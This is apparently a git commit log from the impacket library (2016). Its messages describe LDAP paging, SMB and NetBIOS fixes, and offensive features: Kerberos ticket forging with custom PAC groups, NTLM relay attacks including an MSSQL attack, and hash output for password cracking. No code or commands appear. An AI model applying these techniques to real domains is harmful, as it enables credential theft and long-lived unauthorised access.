commit 0c9b64a592ceb01925af1d3cca8a05301724bfac
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:27:21 2016 +1000

    ready to merge. please test. take 2.

commit 402f334984a01d75d07b495afd49335eb453eca6
Merge: f8dd738c bace3f17
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:23:44 2016 +1000

    Merge remote-tracking branch 'origin/ldap-paging' into ldap-paging
    
    # Conflicts:
    #       impacket/ldap/ldap.py

commit f8dd738c9749244d0f37e493cb43641a79f86eb4
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:17:22 2016 +1000

    ready to merge. please test.

commit bace3f176aa10dec567482a8fe5dc877791b0290
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 23:17:22 2016 +1000

    ready to merge. please test.

commit 4f0bef666ba35ffe1fbf277d5d0b2901a4b1a901
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 22:55:48 2016 +1000

    minor changes

commit 557944359e169c8144e3bfbcaa738baca6692a89
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 17:48:15 2016 +1000

    changed control handling code to accommodate the fact that some controls can have different controlTypes for request and response

commit 090bc35e86d7910f0ebae6209457235de5bf9ef8
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 17:00:33 2016 +1000

    removed unused variable

commit 92e34128669f219269a6b8bb2a1fa7b10af2cade
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 16:24:09 2016 +1000

    fixed broken logic (could have impact if new controls are implemented in the future)

commit 7069281cb7328d2508c8edd178d74d0ff87c18c4
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:50:16 2016 +1000

    fixed a dangling break

commit 34da4acc5a9c9dabbfb7415bb69a76a4a7a59a56
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:48:59 2016 +1000

    removed unneeded enumerate

commit f0c1b016c9b6d4d03a3c1226eefe6606594affcc
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:34:19 2016 +1000

    changed tagFormat in Controls()

commit 50258a8b77f9b68d647c7c7ccaa2715c1c6d9c60
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:26:52 2016 +1000

    removed unused imports

commit 46507c703e95050497cb7938a8392f06d0d31e7d
Merge: c25a8b5b f330e78b
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:25:28 2016 +1000

    Merge branch 'master' into ldap-paging

commit c25a8b5b93047f14945c6f3426b1ebd4b58d801f
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Tue Aug 23 15:19:25 2016 +1000

    added simple paging support
    changed defualt search filter to '(objectClass=*)'
    changed decoder to BER
    added extra non-capturing group in NUM_OID
    removed manualFilter in search as _parseFilter should deal with anything now, just use the string version of your filter in the call

commit f330e78bb2f94b503b3a0e887c0b6cbb96489f5b
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 22 09:20:49 2016 -0300

    Adjusting those fields where a default value is predefined
    
    * Also, changing ASN1 encoding from DER to BER
    * Linked to https://github.com/CoreSecurity/impacket/issues/190#issuecomment-241341614 discussions

commit 1630821cae97eb4905b64aa629a0bc0a7ef9b5c2
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Sat Aug 20 14:19:23 2016 +1000

    changing code for consistency

commit cee61cd53298930a43a1ed2e423d9b15826cb28c
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 18 10:04:45 2016 -0300

    Getting rid of manual search filters and using just strings
    
    * Way easier after @kacpern awesome PR!

commit 8ea9ebc2d05d4f76b656fa7a2d60dcd74e15f7dd
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 18 09:56:45 2016 -0300

    Adding manualFilter parameter to LDAPConnection.search() in order to mantain a way to specify directly Filter objects to be used when searching.
    
    * Will make transition easier for those projects used to the former search API.

commit 8efc4a2f7e7196b0c5fe63d996fcbebe290f28df
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 18 17:24:50 2016 +1000

    minor fix in regular expression

commit e2379346a0ddc2a2217c7ef292c7d8dc2cda12e8
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 18 16:40:21 2016 +1000

    added extensibleMatch string filter parsing

commit 427ad258cf45c767015ff0e92e7fe33aacecf780
Merge: d17cf6f5 01b77623
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 17 10:48:30 2016 -0300

    Merge branch 'kacpern-ldap-filter'

commit 01b776231ad7bdf1c1a801e93214caddd4a3078e
Merge: d17cf6f5 6989a3cb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 17 09:19:59 2016 -0300

    Merge branch 'ldap-filter' of https://github.com/kacpern/impacket into kacpern-ldap-filter

commit 6989a3cb41e002233435c37417fbd50e6c2a7a9e
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:57:38 2016 +1000

    minor fix

commit b6f25451abb5e858cdeb34120b83089ae4784802
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:52:54 2016 +1000

    minor changes

commit 519bda4bf0b1a1721a9711e11ae9c80ebb742829
Merge: 92682d77 b1502a32
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:52:22 2016 +1000

    Merge remote-tracking branch 'origin/ldap-filter' into ldap-filter
    
    # Conflicts:
    #       impacket/ldap/ldap.py

commit 92682d777fae189d008fbc9fc130effe438af5fa
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:47:46 2016 +1000

    fixed 'not' filter

commit b1502a32738e6ed7ae76206d3b0146f832298c82
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:47:46 2016 +1000

    fixed 'not' filter

commit c4eda9d91e9ce07c15ab49905d13b3457e188ede
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 12:35:49 2016 +1000

    added parsing of ldap text filters into a Filter() object

commit d17cf6f587718c794afe229e10bbb72560fb1c79
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 23:09:57 2016 -0500

    Forgot to restore to its original state

commit f8ed7640afd74259fa5079a4db612e35a3bc5103
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 23:08:31 2016 -0500

    Minor cosmetic changes
    
    * Mainly variable renaming so it's easier to understand their meaning
    * Further testing is needed since I can't make it work the attack part. It gets stuck when searching the target LDAP

commit bf4dc4f6ed28e16727a283582e2ba7cf714a5392
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 11:10:50 2016 -0700

    Adding -duration parameter
    
    * By default ticket is valid for 10 years, you can change that now

commit 90a91045139659d83409af1771dcaf697c00de99
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 11 21:29:40 2016 -0700

    Whenever there's an exception triggered when searching the PEK we skip the row
    
    * Hopefully addresses a privately reported issue

commit 8c45d98bba08503088405c00cde9f2dc1f30d5a7
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 11 21:24:02 2016 -0700

    Adding MSSQLAttack() class.
    
    * Now you can specify a SQL statement to be executed after a successful relay is done
    * Addresses a part of https://github.com/CoreSecurity/impacket/issues/188

commit a37d352c0b7fc2fd416d2723f84400a05498bf4f
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 22:27:52 2016 -0700

    Customizing some code

commit 4a10ef4603308ce1bc1d9b9cf7d1fb7eb14a86d4
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:56:52 2016 -0700

    Removing -save option. Saves ticket to disk by default
    
    * Can't find a use case where we would not want this

commit 007c50e871bd55c2e029fa507247404ede5a8415
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:50:36 2016 -0700

    Adding help examples

commit 5812bee6f60b1cf4aecad46d304c197ef7e7b051
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:22:18 2016 -0700

    This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
    allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
    groups, extrasids, etc.
    Tickets duration is fixed to 10 years from now (although you can manually change it)

commit bfeb31ab7eab58c3f47392b587b794d4d4ada783
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 7 23:19:22 2016 -0700

    Changing PAC_SIGNATURE_DATA['SignatureType'] type allowing negative numbers

commit fea99f7493030ec76b1b9cb260b715ba4b5bcd12
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 7 22:46:14 2016 -0700

    Adding [MS-KILE] 3.1.5.9 Key Usage Numbers constants

commit 053cb994d683d9cc8a4228a2662ab58e420fae2b
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 10:28:38 2016 -0300

    Removing PAC structures and using the ones located in the library
    
    * Now located at impacket.krb5.pac

commit 4e56a32350076759b03ffaa34fbdc541f8da7f5e
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 10:25:23 2016 -0300

    Adding [MS-PAC] implementation into the library
    
    * Too many examples already using it, simpler to have it in a single place

commit 5d6879242b46d06095694ff2cee891b2379311f0
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 09:42:02 2016 -0300

    Adding the enumerateMethods() helper function
    
    * If you pass a IDispatch derived interface, it will return a dictionary with the methods and parameters supported by the interface

commit 002d4c33ec94c22017ce7411bcefa00f94131b3c
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 30 15:32:36 2016 -0300

    When a NDRUNION doesn't have any items we still need to return the bytes processed

commit 07723c6f124e087ea0c2f36ce18b3cbc568bf3b8
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 28 15:20:48 2016 -0300

    Adding HKEY_CLASSES_ROOT query support

commit 5a3ae389099a046ffc93daf657ec4e2499636e59
Merge: 801a54a6 6b579a48
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jul 27 09:06:03 2016 -0300

    Merge pull request #185 from real-datagram/master
    
    139 support added (lookupsid)

commit 6b579a488a98fda670c249741ea0c3a7e58dc261
Author: dg <datagram.locks@gmail.com>
Date:   Tue Jul 26 15:41:31 2016 -0700

    139 support added

commit 801a54a6aa94ec32fc38422dc516875cb6e8fae0
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 26 16:03:34 2016 -0300

    Fixed typo

commit a50fdda283f6e4bf906a2076d191ab870869c9a5
Merge: 4a261022 01cb24da
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 26 15:57:03 2016 -0300

    Merge pull request #184 from real-datagram/master
    
    port 139 updates and SMBTransport rewrite (samrdump)

commit 01cb24da0e815e894c3b7953319a8ae81bce24cc
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 17:21:20 2016 -0700

    removed extra comments

commit 2bc0b7aaa4b29c806eb2f6c185e8ab6e4fa384bd
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 17:19:38 2016 -0700

    139 support added

commit ed0a6a4ada866277dfef6d3f1d9bd7f7ef082c0a
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 16:12:03 2016 -0700

    tab vs spaces typo

commit 75344b0c74a59204fdfd21064b6f2986d8ae5db0
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 16:08:54 2016 -0700

    port 139 updates and SMBTransport call to generic DCERPCTransportFactory constructor

commit 4a261022f078983c6d016a23c545dad803764877
Merge: c7f66e67 3c1959ce
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jul 25 17:04:17 2016 -0300

    Merge pull request #182 from real-datagram/master
    
    added port 139 support and related options (smbexec)

commit 3c1959ceda0c00e402820fd875cd9e3515d87686
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 12:36:33 2016 -0700

    added port 139 support and related options

commit c7f66e6793a4a99b70fd0ac2155b7022b5ad8c10
Merge: ee30e662 5835f61c
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 19 14:50:47 2016 -0300

    Merge branch 'real-datagram-master'

commit 5835f61c2d7d7e630c95ea1614d088d12fae9b18
Author: dg <datagram.locks@gmail.com>
Date:   Tue Jul 19 10:13:27 2016 -0700

    added port 139 support and related options

commit ee30e662d3189f239cde8491d18eda39a53e815c
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 14:02:40 2016 -0300

    Fixing typo

commit 4f792fb9f1457af302727a06da783208562fb25f
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 13:58:23 2016 -0300

    Adding -request-user parameter
    
    * Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/178

commit 7c144867073a279d3e2c6fb878383d1d16c8b97b
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 12:15:33 2016 -0300

    Replacing ':' for other character when building the JtR output
    
    * If we don't replace ':' JtR gets confused.
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/179

commit 5ae1231c4d4a01492484d3f2c9ad0dc068fd066f
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 19:37:46 2016 -0300

    Adding query -ve parameter
    
    * Queries for the default value or empty value name
    * Some code correction

commit 24c4921a2d7051b9d9cff76ef03f6074a347e572
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 18:34:03 2016 -0300

    Minor fix in name_registration_request and updated test cases

commit e351505837d7d8547f9754628c9d8eee296d9eba
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 17:40:00 2016 -0300

    NetBIOSError exception redefined, added name_query_request()

commit f73a97ee81a318bc2f6ccf24bffac76a4089143b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 13 18:33:08 2016 -0300

    Adding test case for nmb.py

commit 0808e45b796741aea4162bd756e3f54522e8045b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 13 18:26:27 2016 -0300

    Renaming and recoding of some classes + test case suite
    
    * Many changes to many classes. Much needed for a long time. Aiming at simplifying its work and addding Structure whenever possible.
    * Most probably will break backward compatibility for those using impacket.nmb.

commit d15d01c2fa8c5a0201a121215b7413b7b90a2358
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 8 22:04:41 2016 -0300

    Bugfixes
    
    * Changing logic for __print_all_subkeys_and_entries() method
    * Striping NULL character when printing lpNameOut
    * Better error control when an exception is triggered

commit 91aab87e135806427ae9e7aabda98535542a6437
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 8 21:03:14 2016 -0300

    Changing default value for hBaseRegEnumValue
    
    * Also optimizing the way we craft the packet to minimize trafic
    * Raising exception if trying more than once with the modified size received from the server

commit 04310006e4641c305642c25d48f4ca45f5c1e560
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 22:01:29 2016 -0300

    Restoring the right order in enableRegistry() and adding a warning message
    
    * In case we cannot check the RemoteRegistry status. We'll continue and hope for the best

commit 1a29f0ae3c0098d4f5b5b22b900549f05512e133
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 21:14:55 2016 -0300

    Fixed bug where KeyName wasn't printed correctly when -s switch used

commit f27c39da235ae23ac50af3cb92ca5bb1adef3915
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:58:01 2016 -0300

    Continuing if there are keys that cannot be opened

commit e08966ef10edcf696137280c938c6b934a42018b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:36:30 2016 -0300

    Continuing if we cannot connect to SCMR to check RemoteRegistry state
    
    * Maybe a low level user connecting? :-o!

commit b2413d25a50a5d5c09c8c8317d069c092178785e
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:12:38 2016 -0300

    Setting socket timeout when connecting a new NetBIOSTCPSession
    
    * After connect(), we're restoring the previous timeout (should be None most of the times) because we handle timeouts later in a different way
    * Addresses https://github.com/CoreSecurity/impacket/issues/173

commit e8764446b54193292cc88973ba7965eea5c945f8
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 09:36:46 2016 -0300

    Making sure we return an ascii encoded string after performing first and second level encoding.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/172#issuecomment-230631476

commit f04398f2e331330cc18e97208e0ae5bb639252c1
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 09:01:44 2016 -0300

    If SMBConnection times out, reconnect it

commit f8c19620ea0685421a5400d7869e20d196d0682c
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 5 20:22:01 2016 -0300

    Adding SMBConnection.reconnect() capability
    
    * reconnects the SMB object based on the original options and credentials used. Only exception is that
      manualNegotiate will not be honored.
      Not only the connection will be created but also a login attempt using the original credentials and
      method (Kerberos, PtH, etc)

commit 103ea978fa6d580367f42aca6aae2678c5cbefa0
Merge: b13acf3e d246ae57
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 5 11:47:40 2016 -0300

    Merge pull request #175 from fox-it/ntlmrelay-fixes
    
    ntlmrelayx bugfixes

commit d246ae5751721dc71b89c944e4345e6d723b9015
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jul 5 16:36:13 2016 +0200

    ntlmrelayx bugfixes

commit b13acf3e64a8cef11537f6e6820ce5221b93069d
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 19:10:59 2016 -0300

    Automatically enables/starts/stops/disables the RemoteRegistry service when needed
    
    * Also part of https://github.com/CoreSecurity/impacket/issues/127 requests
    * Commented actions yet not implemented

commit e5c4bdaa04d8bc474f35186f78a06fca32d311b0
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 18:43:10 2016 -0300

    We remove the session resume file if ERROR_DS_DRA_BAD_DN error was triggered

commit 75167141137133248276f5458dc8d86ad10d2b8c
Merge: 5acf2b45 4e3ebc43
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 15:48:30 2016 -0300

    Merge branch 'manuporto-master'

commit 4e3ebc43c09d0b4b07c89429234e4c54ff991b67
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 15:47:05 2016 -0300

    Minor cosmetic changes
    
    * Copyright notices
    * Variable renamings
    * Reusing library code
    * minor logic flow changed

commit 421d390555d89fd86fc4a8b0084321d3c3cff917
Merge: 5acf2b45 e950f158
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 13:19:18 2016 -0300

    Merge branch 'master' of https://github.com/manuporto/impacket into manuporto-master

commit 5acf2b4579ff0a19c4115eaa0b489557ac3e9f62
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:29:20 2016 -0300

    Adding debug logging output for the exception

commit d824905276dfd2a1863e82136b5eed9fd6ba20cd
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:28:56 2016 -0300

    Undoing an unnecessary change

commit 267ee5e0657b29fe8b3c05160b3e27365fafe572
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:07:33 2016 -0300

    Adding -port parameter to support 445/tcp and 139/tcp as destination ports
    
    * I create a new parameters group called 'connection' where you can specify the destination port, the domain controller IP and the target IP (if needed)
    * We should propagate the same schema over the rest of the scripts (whenever applicable)
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/172

commit fe705da38e1448819ecd83762cd979950e5e8468
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 15:57:25 2016 -0300

    Improving support for connections using NETBIOS_SESSION_PORT as target port
    
    * We're trying to honor the remoteName whenever possible.
    * If user asked for *SMBSERVER as the target name, the library will try to find the target's netbios name on its own.
    * Could potentially bring some incompatibilities with previous implementations, so please test this as much as possible
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/172

commit 833943d26d76999a612a1cf38e4cfc26a8ad20d3
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:33:14 2016 -0300

    Adding Called Name when NETBIOS_SESSION_NEGATIVE_RESPONSE is raised

commit 7fbfde35dfd1ddccf520060977e5ba452d19cf36
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:24:13 2016 -0300

    Adding getRemoteName() method.
    
    * This is what the user specified when creating the SMBConnection object.

commit ef2ed82977ac746fe44ac19356f9c923d3d67215
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:22:46 2016 -0300

    Renaming get_dip() for getRemoteHost()
    
    * Why? Because not always the target is a IP address

commit 0b71f6532b0f448278b8049e860921ed2088055b
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 11:05:48 2016 -0300

    Adding more UUIDs based on updated protocol standards

commit ebd9fa4cb01b844984abb63e3fd272b9fc14773d
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 10:43:27 2016 -0300

    Simplifying dynamic imports
    
    * Used when building a RPC Reponse
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/126 (I couldn't reproduce it)

commit 20b661efd234973a560b71d6743f47800f2a3c3f
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 28 14:29:12 2016 -0300

    And now coming back to dev :)

commit 7b0bfb763e80e6cc3f1bbc902ccc3fbcfad1b5d8
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 28 14:20:27 2016 -0300

    About to tag new version 0.9.15

commit 0481f3356c8c4ce9deccc0be2d718d11404b97c1
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 27 13:45:29 2016 -0300

    Forgot to set the tag for SubstringFilter
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/170

commit c3f8d9a7d58146093ca6fc08526b42951401c905
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 27 13:44:19 2016 -0300

    Don't fill up the attributes item if there are no attributes asked

commit 014928c48e1bbeefae34163beab807f86b809ea7
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 24 15:49:20 2016 -0300

    Fixing imports
    
    * We don't like import *

commit e950f158f3e198bb561496d31fc70b83c86a661d
Author: mporto <mporto@fi.uba.ar>
Date:   Fri Jun 24 12:23:18 2016 -0300

    Typo

commit 6f999e5756b89b49de6079621f8490cbdad1fcac
Author: mporto <mporto@fi.uba.ar>
Date:   Fri Jun 24 12:20:43 2016 -0300

    Reg example with partial query functionality

commit 16a321228cabf577f4e74daa242373d425e4d3de
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 19:28:29 2016 -0300

    Adding changes for the upcoming version
    
    * We're tagging as soon as we verify https://github.com/CoreSecurity/impacket/issues/168

commit 84252ae98dec44141ab82561b72202988ff2e376
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 19:22:12 2016 -0300

    doAttack() now keeps a list of target successfully attacked
    
    * Then we read it in the main thread and decide whether or not to attack again based on the -one-shot parameter
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/168

commit e9e639a267eb87aabe1f5fb7e2ce4481eaed5ec1
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 17:45:22 2016 -0300

    Flags2 adjustements to avoid some stacks from whining
    
    * mazel tov! :)

commit ccf9c2b4451bfe9244e62ef49d44d1b0f5c05c75
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 12:18:57 2016 -0300

    Automatically adjust buffer size for hBaseRegQueryValue

commit 66111c8271c318fa4032efb6d6634441664857d8
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 12:06:28 2016 -0300

    Automatically adjust buffer size for hBaseRegEnumValue
    
    * If the original one didn't wasn't large enough
    * If you know the size in advance, you can specify it through dataLen parameter
    * Adjusted test case to trigger this situation

commit 9aeee403ca3e40bfef91b9099f100e2e68fd09ed
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 15:36:31 2016 -0300

    Adding the actual SPN to the JtR output produced (and saved via -outputfile)
    
    * Now -outputfile automatically selects -request

commit d6c065a820dc3dd90cb1bf91bb81be22f8f93102
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 14:47:35 2016 -0300

    Adding exception handler when processing each record
    
    * Handling pwdLastSet if it was never changed (hopefully)

commit 60f9fa627b3553e0330cbe543571a9db9ef672f1
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 14:25:26 2016 -0300

    Whenever we receive sizeLimitExceeded exception, we still process what we've got
    
    * Will give you some results until we implement paged searches

commit 55d1f3ff27b527cc00f66281993002058f5568dc
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 10:06:41 2016 -0300

    Extra checks if login didn't succeed

commit ffe7e92afdd8395d24986781da5eca42b2b0b05d
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 09:57:29 2016 -0300

    We shouldn't process cipherText if it wasn't processed before
    
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/167 although it needs to be verified

commit 33794acbfa73c33e436354f635fcc9f7ae0a887f
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 15 09:27:49 2016 -0300

    Removing unnecessary dependency package

commit acc7a046727ea81bb27fafcb90e95bb359eb5ad4
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 14 13:02:09 2016 -0300

    Using httplib instead of requests plus error fixings
    
    * httplib comes by default, much better than requiring another dependency
    * Removed debug messages
    * Fixed minor errors

commit a769fbca94a5c85ed58cb0e5650f2d621ed2c435
Merge: f618a5f1 adb01d65
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jun 14 10:53:26 2016 -0300

    Merge pull request #166 from fox-it/httprelayclient
    
    httprelayclient for ntlmrelayx

commit adb01d65df8315f9de6e09dfcc8cce6c5632b1a6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jun 14 11:10:02 2016 +0200

    Added optional path support to target specification, fixed port parsing

commit 467ad252d4701a9a4bb050b99f5d74c961d3fda8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jun 14 11:02:57 2016 +0200

    HTTP relay client

commit f618a5f1e10d5f893907ad85b65b3c8d759a3537
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 8 20:16:51 2016 -0300

    Setting DRSBind.dwExtCaps accordingly so Win2016 TP5 with PAM is happy about us
    
    * Plus any other possible thing
    * Fixes https://github.com/CoreSecurity/impacket/issues/165
    * Thanks @gentilkiwi and @MichaelGrafnetter for your input

commit dd557b9a79f535ffae0dc8bedc37a9b873a9b20e
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 19:09:22 2016 -0300

    Adding DRS_EXT_GETCHGREPLY_V9 as a possible DRSGetNCChanges answer
    
    * Now we access the structures for both _V6 and V9
    * We added we support this feature in DRSBind().dwflags
    * Addresses issue found by @MichaelGrafnetter (https://github.com/CoreSecurity/impacket/issues/165)
    * Still needs to be tested but don't have yet a TP 5 propery configured.

commit c5dd3b86f0d0c21636f23a6a6905e3a53092e53e
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 18:56:53 2016 -0300

    Adding also the flag to support _V9 replies
    
    * DRS_EXT_GETCHGREPLY_V9

commit 27ed488d2786b5c66d844237fe797b2167841681
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 18:49:59 2016 -0300

    Adding new structures added for 2016 TP5 PAM support
    
    * In particular DRS_MSG_GETCHGREPLY_V9 and everything that depends on it
    * This is needed for addressing https://github.com/CoreSecurity/impacket/issues/165 (also detailed here https://github.com/gentilkiwi/mimikatz/issues/47)

commit 04c66e588083dbcff855c1b476f0cdad98141435
Merge: 07f19817 7b2f9421
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 3 21:43:04 2016 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 07f19817d6ca2a819265814b519d271c30657d5c
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 3 21:38:48 2016 -0300

    Adding one-shot parameter
    
    * After successful authentication, only execute the attack once for each target (per protocol)

commit 7b2f942121e15c690463e988e1f1e84ed07963d2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 31 22:42:38 2016 -0300

    Update README.md

commit 1bdba4837425a9546380b0962649fa114140496c
Author: asolino <bethus@gmail.com>
Date:   Tue May 31 21:22:54 2016 -0300

    Adding -dc-ip option to examples
    
    * Allows to specifying the IP address for the DC/kdcHost
    * Collateral for https://github.com/CoreSecurity/impacket/issues/160

commit 19f7fe90edfd4e651b63c14d8f125f17416fef2f
Author: asolino <bethus@gmail.com>
Date:   Tue May 31 21:15:16 2016 -0300

    Adding ability to specify kdcHost for DCERPC/DCOM layers
    
    * Adding kdcHost to the classes constructors (when applicable)
    * Through DCERPCTransport.set_kerberos() now you also can specify the kdcHost
    * Added DCERPCTransport.get_kdcHost() that will be used by DCOM and DCERPC
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/160

commit cea19373434b808ae62d362af3bac360d2488ba8
Author: asolino <bethus@gmail.com>
Date:   Mon May 30 18:49:11 2016 -0300

    If ldap:// fails, we try ldaps://

commit a813b202ad45b990cd79bbd17dd9b4e8e7cf168f
Author: asolino <bethus@gmail.com>
Date:   Mon May 30 18:48:13 2016 -0300

    When setting a value, we pack it depending on the data type

commit c1cce7636cc7b201caa2a9bd8a71a33e4a3d17b1
Merge: d96a5370 0bb0b2bf
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:51:44 2016 -0300

    Merge branch 'fox-it-master'

commit 0bb0b2bf2843ea493223553f9542a4b971a6c327
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:47:33 2016 -0300

    More fixups and cosmetic changes

commit 5b31f9c26768552ff3effdbc139b62dcea219194
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:46:17 2016 -0300

    Forgot to change setup.py with new ntlmrelayx location

commit a1912824eb99ccf48b561d7ad716c92abf43aba3
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:44:28 2016 -0300

    Moving impacket.ntlmrelayx to impacket.examples.ntlmrelayx
    
